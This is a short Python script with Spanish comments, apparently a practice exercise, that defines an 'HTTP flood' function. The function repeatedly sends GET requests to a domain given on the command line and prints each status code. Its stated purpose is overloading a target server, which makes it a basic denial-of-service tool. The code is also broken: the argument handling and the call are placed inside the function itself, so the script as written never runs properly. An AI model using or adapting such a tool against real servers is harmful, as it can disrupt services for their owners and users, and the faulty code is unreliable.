import sys
import requests
import time

def hacer_flood_http(dominio, num_peticiones, intervalo=0.1): #definimos la funcion y ponemos valores por defecti al parámetro opcional
    try:
        for i in range(num_peticiones):
            #hacemos peticiones get en funcion al numero de peticiones que le pasemos a la funcion
            respuesta = requests.get(dominio)
            
            #mostramos el status code para ver como ha ido la peticion
            print(f"Petición {i+1}: Código de estado {respuesta.status_code}")

            #configuramos el intervalo de tiempo que va a esperar el programa cada vez que lancemos una peticion para lanzar otra
            time.sleep(intervalo)

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    #indicamos a que parametro apuntan los valores que recibimos 
    dominio = sys.argv[1]
    num_peticiones = int(sys.argv[2])

    #parámetro opcional para el intervalo entre peticiones (por defecto es 0.1 segundos)
    intervalo = float(sys.argv[3]) if len(sys.argv) > 3 else 0.1

    #ejecutamos la funcion
    hacer_flood_http(dominio, num_peticiones, intervalo)

#para ejecutar este archivo solo tendremos que usar python3 practicaej5.py http://example.com 100 0.05
